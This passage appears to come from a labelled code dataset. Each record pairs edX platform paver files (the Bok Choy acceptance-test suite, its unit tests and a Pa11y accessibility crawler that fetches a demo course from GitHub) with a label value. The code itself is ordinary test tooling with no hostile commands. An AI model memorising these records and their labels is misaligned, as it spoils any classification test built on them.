bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', True))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n/n/n/n", "label": 0}, {"id": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "code": "/pavelib/paver_tests/test_paver_bok_choy_cmds.py/n/n\"\"\"\nTests for the bok-choy paver commands themselves.\nRun just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py\n\"\"\"\nimport os\nimport unittest\n\nfrom mock import patch, call\nfrom test.test_support import EnvironmentVarGuard\nfrom paver.easy import BuildFailure\nfrom pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler\n\nREPO_DIR = os.getcwd()\n\n\nclass TestPaverBokChoyCmd(unittest.TestCase):\n    \"\"\"\n    Paver Bok Choy Command test cases\n    \"\"\"\n\n    def _expected_command(self, name, store=None, verify_xss=False):\n        \"\"\"\n        Returns the command that is expected to be run for the given test spec\n        and store.\n        \"\"\"\n\n        expected_statement = (\n            \"DEFAULT_STORE={default_store} \"\n            \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \"\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \"\n            \"SELENIUM_DRIVER_LOG_DIR='{repo_dir}/test_root/log{shard_str}' \"\n            \"VERIFY_XSS='{verify_xss}' \"\n            \"nosetests {repo_dir}/common/test/acceptance/{exp_text} \"\n            \"--with-xunit \"\n            \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \"\n            \"--verbosity=2 \"\n        ).format(\n            default_store=store,\n            repo_dir=REPO_DIR,\n            shard_str='/shard_' + self.shard if self.shard else '',\n            exp_text=name,\n            a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',\n            verify_xss=verify_xss\n        )\n        return expected_statement\n\n    def setUp(self):\n        super(TestPaverBokChoyCmd, self).setUp()\n        self.shard = os.environ.get('SHARD')\n        self.env_var_override = EnvironmentVarGuard()\n\n    def test_default(self):\n        suite = BokChoyTestSuite('')\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_suite_spec(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_class_spec(self):\n        spec = 'test_foo.py:FooTest'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_testcase_spec(self):\n        spec = 'test_foo.py:FooTest.test_bar'\n        suite = BokChoyTestSuite('', test_spec=spec)\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(suite.cmd, self._expected_command(name=name))\n\n    def test_spec_with_draft_default_store(self):\n        spec = 'test_foo.py'\n        suite = BokChoyTestSuite('', test_spec=spec, default_store='draft')\n        name = 'tests/{}'.format(spec)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='draft')\n        )\n\n    def test_invalid_default_store(self):\n        # the cmd will dumbly compose whatever we pass in for the default_store\n        suite = BokChoyTestSuite('', default_store='invalid')\n        name = 'tests'\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=name, store='invalid')\n        )\n\n    def test_serversonly(self):\n        suite = BokChoyTestSuite('', serversonly=True)\n        self.assertEqual(suite.cmd, \"\")\n\n    def test_verify_xss(self):\n        suite = BokChoyTestSuite('', verify_xss=True)\n        name = 'tests'\n        self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_verify_xss_env_var(self):\n        self.env_var_override.set('VERIFY_XSS', 'True')\n        with self.env_var_override:\n            suite = BokChoyTestSuite('')\n            name = 'tests'\n            self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True))\n\n    def test_test_dir(self):\n        test_dir = 'foo'\n        suite = BokChoyTestSuite('', test_dir=test_dir)\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(name=test_dir)\n        )\n\n    def test_verbosity_settings_1_process(self):\n        \"\"\"\n        Using 1 process means paver should ask for the traditional xunit plugin for plugin results\n        \"\"\"\n        expected_verbosity_string = (\n            \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else ''\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=1)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_2_processes(self):\n        \"\"\"\n        Using multiple processes means specific xunit, coloring, and process-related settings should\n        be used.\n        \"\"\"\n        process_count = 2\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_verbosity_settings_3_processes(self):\n        \"\"\"\n        With the above test, validate that num_processes can be set to various values\n        \"\"\"\n        process_count = 3\n        expected_verbosity_string = (\n            \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\"\n            \" --processes={procs} --no-color --process-timeout=1200\".format(\n                repo_dir=REPO_DIR,\n                shard_str='/shard_' + self.shard if self.shard else '',\n                procs=process_count\n            )\n        )\n        suite = BokChoyTestSuite('', num_processes=process_count)\n        self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string)\n\n    def test_invalid_verbosity_and_processes(self):\n        \"\"\"\n        If an invalid combination of verbosity and number of processors is passed in, a\n        BuildFailure should be raised\n        \"\"\"\n        suite = BokChoyTestSuite('', num_processes=2, verbosity=3)\n        with self.assertRaises(BuildFailure):\n            BokChoyTestSuite.verbosity_processes_string(suite)\n\n\nclass TestPaverPa11yCrawlerCmd(unittest.TestCase):\n\n    \"\"\"\n    Paver pa11ycrawler command test cases.  Most of the functionality is\n    inherited from BokChoyTestSuite, so those tests aren't duplicated.\n    \"\"\"\n\n    def setUp(self):\n        super(TestPaverPa11yCrawlerCmd, self).setUp()\n\n        # Mock shell commands\n        mock_sh = patch('pavelib.utils.test.suites.bokchoy_suite.sh')\n        self._mock_sh = mock_sh.start()\n\n        # Cleanup mocks\n        self.addCleanup(mock_sh.stop)\n\n    def _expected_command(self, report_dir, start_urls):\n        \"\"\"\n        Returns the expected command to run pa11ycrawler.\n        \"\"\"\n        expected_statement = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains=localhost '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher=logout '\n            '--pa11y-reporter=\"1.0-json\" '\n            '--depth-limit=6 '\n        ).format(\n            start_urls=' '.join(start_urls),\n            report_dir=report_dir,\n        )\n        return expected_statement\n\n    def test_default(self):\n        suite = Pa11yCrawler('')\n        self.assertEqual(\n            suite.cmd,\n            self._expected_command(suite.pa11y_report_dir, suite.start_urls)\n        )\n\n    def test_get_test_course(self):\n        suite = Pa11yCrawler('')\n        suite.get_test_course()\n        self._mock_sh.assert_has_calls([\n            call(\n                'wget {targz} -O {dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)),\n            call(\n                'tar zxf {dir}demo_course.tar.gz -C {dir}'.format(dir=suite.imports_dir)),\n        ])\n\n    def test_generate_html_reports(self):\n        suite = Pa11yCrawler('')\n        suite.generate_html_reports()\n        self._mock_sh.assert_has_calls([\n            call(\n                'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir)),\n        ])\n/n/n/n/pavelib/utils/test/suites/bokchoy_suite.py/n/n\"\"\"\nClass used for defining and running Bok Choy acceptance test suite\n\"\"\"\nfrom time import sleep\nfrom urllib import urlencode\n\nfrom common.test.acceptance.fixtures.course import CourseFixture, FixtureError\n\nfrom path import Path as path\nfrom paver.easy import sh, BuildFailure\nfrom pavelib.utils.test.suites.suite import TestSuite\nfrom pavelib.utils.envs import Env\nfrom pavelib.utils.test import bokchoy_utils\nfrom pavelib.utils.test import utils as test_utils\n\nimport os\n\ntry:\n    from pygments.console import colorize\nexcept ImportError:\n    colorize = lambda color, text: text\n\n__test__ = False  # do not collect\n\nDEFAULT_NUM_PROCESSES = 1\nDEFAULT_VERBOSITY = 2\n\n\nclass BokChoyTestSuite(TestSuite):\n    \"\"\"\n    TestSuite for running Bok Choy tests\n    Properties (below is a subset):\n      test_dir - parent directory for tests\n      log_dir - directory for test output\n      report_dir - directory for reports (e.g., coverage) related to test execution\n      xunit_report - directory for xunit-style output (xml)\n      fasttest - when set, skip various set-up tasks (e.g., collectstatic)\n      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C\n      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment\n      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.\n      default_store - modulestore to use when running tests (split or draft)\n      num_processes - number of processes or threads to use in tests. Recommendation is that this\n      is less than or equal to the number of available processors.\n      verify_xss - when set, check for XSS vulnerabilities in the page HTML.\n      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(BokChoyTestSuite, self).__init__(*args, **kwargs)\n        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')\n        self.log_dir = Env.BOK_CHOY_LOG_DIR\n        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)\n        self.xunit_report = self.report_dir / \"xunit.xml\"\n        self.cache = Env.BOK_CHOY_CACHE\n        self.fasttest = kwargs.get('fasttest', False)\n        self.serversonly = kwargs.get('serversonly', False)\n        self.testsonly = kwargs.get('testsonly', False)\n        self.test_spec = kwargs.get('test_spec', None)\n        self.default_store = kwargs.get('default_store', None)\n        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)\n        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)\n        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))\n        self.extra_args = kwargs.get('extra_args', '')\n        self.har_dir = self.log_dir / 'hars'\n        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE\n        self.imports_dir = kwargs.get('imports_dir', None)\n        self.coveragerc = kwargs.get('coveragerc', None)\n        self.save_screenshots = kwargs.get('save_screenshots', False)\n\n    def __enter__(self):\n        super(BokChoyTestSuite, self).__enter__()\n\n        # Ensure that we have a directory to put logs and reports\n        self.log_dir.makedirs_p()\n        self.har_dir.makedirs_p()\n        self.report_dir.makedirs_p()\n        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter\n\n        if not (self.fasttest or self.skip_clean or self.testsonly):\n            test_utils.clean_test_files()\n\n        msg = colorize('green', \"Checking for mongo, memchache, and mysql...\")\n        print msg\n        bokchoy_utils.check_services()\n\n        if not self.testsonly:\n            self.prepare_bokchoy_run()\n        else:\n            # load data in db_fixtures\n            self.load_data()\n\n        msg = colorize('green', \"Confirming servers have started...\")\n        print msg\n        bokchoy_utils.wait_for_test_servers()\n        try:\n            # Create course in order to seed forum data underneath. This is\n            # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C 